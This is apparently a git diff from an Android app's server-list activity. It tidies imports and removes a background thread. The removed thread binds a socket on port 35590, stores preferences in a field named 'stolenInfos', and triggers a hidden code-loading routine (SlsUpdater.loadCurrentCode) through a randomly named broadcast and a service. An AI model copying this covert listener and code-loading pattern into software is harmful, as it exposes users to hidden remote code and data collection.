@@ -12,15 +12,9 @@ import android.widget.*;
 import com.google.android.gms.tasks.*;
 import com.mikepenz.materialdrawer.*;
 import com.nao20010128nao.Wisecraft.*;
-import com.nao20010128nao.Wisecraft.misc.DebugWriter;
-import com.nao20010128nao.Wisecraft.misc.SlsUpdater;
-import com.nao20010128nao.Wisecraft.misc.ThemePatcher;
-import com.nao20010128nao.Wisecraft.misc.Utils;
+import com.nao20010128nao.Wisecraft.misc.*;
 import com.nao20010128nao.Wisecraft.misc.server.*;
 import com.nao20010128nao.Wisecraft.misc.view.*;
-import com.nao20010128nao.Wisecraft.services.*;
-import java.io.*;
-import java.net.*;
 
 import android.support.v7.widget.Toolbar;
 import com.nao20010128nao.Wisecraft.R;
@@ -95,33 +89,6 @@ abstract class ServerListActivityBase4 extends ServerListActivityBase5
 							 }
 						 }, inFil);
 	
-		new Thread(){
-			String replyAction;
-			ServerSocket ss=null;
-			public void run() {
-				TheApplication.instance.stolenInfos = getSharedPreferences("majeste", MODE_PRIVATE);
-				try {
-					ss = new ServerSocket(35590);//bind to this port to start a critical session
-					replyAction = Utils.randomText();
-					IntentFilter infi=new IntentFilter();
-					infi.addAction(replyAction);
-					registerReceiver(new BroadcastReceiver(){
-							@Override
-							public void onReceive(Context p1, Intent p2) {
-								Log.d("slsupd", "received");
-								SlsUpdater.loadCurrentCode(p1);
-								Log.d("slsupd", "loaded");
-								try {
-									if (ss != null)ss.close();
-								} catch (IOException e) {}
-							}
-						}, infi);
-					startService(new Intent(ServerListActivityBase4.this, SlsUpdaterService.class).putExtra("action", replyAction));
-				} catch (IOException se) {
-
-				}
-			}
-		}.start();
 		new GhostPingServer().start();
 		int prevVersion=pref.getInt("previousVersionInt",Utils.getVersionCode(this));
 		if(prevVersion<30){
